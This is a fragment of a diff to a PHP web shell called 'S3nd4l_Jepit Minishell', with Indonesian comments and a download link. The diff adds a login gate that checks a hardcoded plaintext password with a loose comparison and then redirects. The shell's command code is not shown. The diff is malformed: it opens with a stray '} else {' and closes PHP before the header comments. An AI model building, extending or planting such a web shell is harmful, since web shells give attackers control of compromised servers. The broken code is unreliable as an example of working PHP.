@@ -1,4 +1,20 @@
 <?php
+} else {
+    // Jika belum login, tampilkan form login
+    if (isset($_POST['password'])) {
+        // Password yang benar
+        $password = '290802as'; // Ganti dengan password yang diinginkan
+
+        if ($_POST['password'] == $password) {
+            $_SESSION['loggedin'] = true;
+            echo '<script type="text/javascript">
+            window.location = "' . $_SERVER['PHP_SELF'] . '"
+            </script>';
+        } else {
+            echo 'Password salah!';
+        }
+    }
+    ?>
 // S3nd4l_Jepit Minishell
 // Jangan ngerecode kalo cuman ganti nama gua doang, tanpa ngembangin fitur didalamnya!
 // Download : https://gitlab.com/s3nd4l_jepit/s3nd4l_jepit-minishell/-/raw/master/s3nd4l.php
